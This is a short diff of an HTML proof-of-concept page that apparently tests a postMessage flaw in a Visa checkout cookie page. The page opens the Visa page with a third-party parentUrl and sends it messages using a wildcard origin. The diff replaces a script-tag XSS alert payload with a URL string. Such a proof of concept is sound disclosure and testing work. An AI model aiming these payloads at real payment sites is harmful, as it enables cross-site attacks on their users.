@@ -6,14 +6,14 @@
     <script>
         function pocLink() {
             let win = window.open('https://secure.checkout.visa.com/resources/html/cookie_health/cookie_ready.html?parentUrl=https://xsnapfish.com/visa.html');
-            let msg = "<script>alert('XSS');</script>";
+            let msg = "https://secure.checkout.visa.com";
             
             setTimeout(function(){
                 win.postMessage(msg, '*');
             }, 5000);
         }
         function pocFrame(win) {           
-            let msg = "<script>alert('XSS');</script>";
+            let msg = "https://secure.checkout.visa.com";
             
             win.postMessage(msg, '*');          
         }
